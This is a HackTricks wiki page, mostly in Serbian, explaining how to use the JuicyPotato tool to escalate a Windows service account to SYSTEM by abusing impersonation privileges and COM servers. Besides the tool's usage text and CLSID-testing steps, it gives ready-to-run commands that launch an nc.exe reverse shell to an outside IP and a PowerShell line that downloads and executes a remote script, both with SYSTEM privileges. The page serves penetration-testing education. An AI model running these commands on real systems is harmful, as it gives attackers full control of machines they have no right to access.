# JuicyPotato

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato ne radi** na Windows Server 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje `NT AUTHORITY\SYSTEM`** nivo pristupa. _**Proverite:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Slađena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo soka, tj. **još jedan alat za lokalnu eskalaciju privilegija, od Windows servisnih naloga do NT AUTHORITY\SYSTEM**_

#### Možete preuzeti juicypotato sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Sažetak <a href="#summary" id="summary"></a>

[**Iz juicypotato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njene [varijante](https://github.com/decoder-it/lonelypotato) koriste lanac eskalacije privilegija zasnovan na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM slušalac na `127.0.0.1:6666` i kada imate `SeImpersonate` ili `SeAssignPrimaryToken` privilegije. Tokom pregleda Windows verzije otkrili smo podešavanje gde je `BITS` namerno onemogućen i port `6666` je zauzet.

Odlučili smo da oružamo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Pozdravite Juicy Potato**.

> Za teoriju, pogledajte [Rotten Potato - Eskalacija privilegija od servisnih naloga do SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac linkova i referenci.

Otkrili smo da, osim `BITS`, postoji nekoliko COM servera koje možemo zloupotrebiti. Oni samo treba da:

1. budu instancirani od strane trenutnog korisnika, obično "korisnika servisa" koji ima privilegije impersonacije
2. implementiraju `IMarshal` interfejs
3. rade kao uzvišeni korisnik (SYSTEM, Administrator, …)

Nakon nekog testiranja dobili smo i testirali opsežnu listu [zanimljivih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko verzija Windows-a.

### Sočne informacije <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vam omogućava:

* **Ciljani CLSID** _izaberite bilo koji CLSID koji želite._ [_Ovde_](http://ohpe.it/juicy-potato/CLSID/) _možete pronaći listu organizovanu po OS-u._
* **COM slušalac port** _definišite COM slušalac port koji preferirate (umesto marširanog hardkodiranog 6666)_
* **COM slušalac IP adresa** _vežite server na bilo koju IP adresu_
* **Način kreiranja procesa** _u zavisnosti od privilegija impersoniranog korisnika možete izabrati:_
* `CreateProcessWithToken` (potrebne `SeImpersonate`)
* `CreateProcessAsUser` (potrebne `SeAssignPrimaryToken`)
* `oba`
* **Proces za pokretanje** _pokrenite izvršni fajl ili skriptu ako eksploatacija uspe_
* **Argument procesa** _prilagodite argumente pokrenutog procesa_
* **RPC Server adresa** _za diskretniji pristup možete se autentifikovati na eksterni RPC server_
* **RPC Server port** _korisno ako želite da se autentifikujete na eksterni server i vatrozid blokira port `135`…_
* **TEST mod** _pretežno za testiranje, tj. testiranje CLSID-ova. Kreira DCOM i štampa korisnika tokena. Pogledajte_ [_ovde za testiranje_](http://ohpe.it/juicy-potato/Test/)

### Korišćenje <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**Iz juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ako korisnik ima `SeImpersonate` ili `SeAssignPrimaryToken` privilegije, onda ste **SYSTEM**.

Skoro je nemoguće sprečiti zloupotrebu svih ovih COM servera. Možete razmisliti o modifikaciji dozvola ovih objekata putem `DCOMCNFG`, ali srećno, ovo će biti izazovno.

Pravo rešenje je zaštita osetljivih naloga i aplikacija koje rade pod `* SERVICE` nalozima. Zaustavljanje `DCOM` bi sigurno sprečilo ovu eksploataciju, ali bi moglo imati ozbiljan uticaj na osnovni operativni sistem.

Iz: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Napomena: Posetite [ovu stranicu](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete isprobati.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Pokrenite novi CMD (ako imate RDP pristup)

![](<../../.gitbook/assets/image (300).png>)

## CLSID Problemi

Često, podrazumevani CLSID koji JuicyPotato koristi **ne radi** i eksploatacija ne uspeva. Obično je potrebno više pokušaja da se pronađe **funkcionalni CLSID**. Da biste dobili listu CLSID-ova koje treba isprobati za određeni operativni sistem, trebate posetiti ovu stranicu:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Proveravanje CLSID-ova**

Prvo, biće vam potrebni neki izvršni fajlovi osim juicypotato.exe.

Preuzmite [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u vašu PS sesiju, a zatim preuzmite i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Taj skript će kreirati listu mogućih CLSID-ova za testiranje.

Zatim preuzmite [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(promenite putanju do liste CLSID-ova i do juicypotato izvršnog fajla) i izvršite ga. Počeće da pokušava svaki CLSID, i **kada se broj porta promeni, to će značiti da je CLSID radio**.

**Proverite** funkcionalne CLSID-ove **koristeći parametar -c**

## Reference

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
